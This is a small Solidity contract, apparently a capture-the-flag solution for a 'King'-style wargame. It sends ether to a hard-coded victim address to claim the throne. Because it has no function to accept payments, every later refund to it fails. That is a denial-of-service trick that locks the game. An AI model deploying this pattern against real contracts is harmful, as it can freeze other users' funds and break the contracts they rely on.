//SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract LastKing {

address public victimAddr = 0xD576c0c763C36F8a6Db67f41f1dE688597cc5024;

constructor() payable {
        (bool success, ) = address(victimAddr).call{value: msg.value}(""); //becoming the last king
        require(success, "success");
}

}